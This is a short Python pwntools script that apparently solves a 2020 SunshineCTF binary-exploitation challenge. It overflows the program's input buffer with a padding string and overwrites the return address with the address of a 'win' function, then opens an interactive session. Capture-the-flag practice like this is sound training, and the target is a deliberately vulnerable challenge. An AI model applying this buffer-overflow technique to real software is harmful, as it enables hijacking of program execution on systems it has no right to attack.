#!/usr/bin/env python3

from pwn import *

context.binary = ELF('./chall_02')

if args.REMOTE:
    io = remote('chal.2020.sunshinectf.org', 30002)
else:
    io = process(context.binary.path)

print(io.recvline())
io.sendline('throwaway')

buffer = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPP'
payload = p32(0x080484d6) # address of win function
exploit = flat(buffer, payload)


print("Sending: ", exploit)
io.sendline(exploit)

io.interactive()
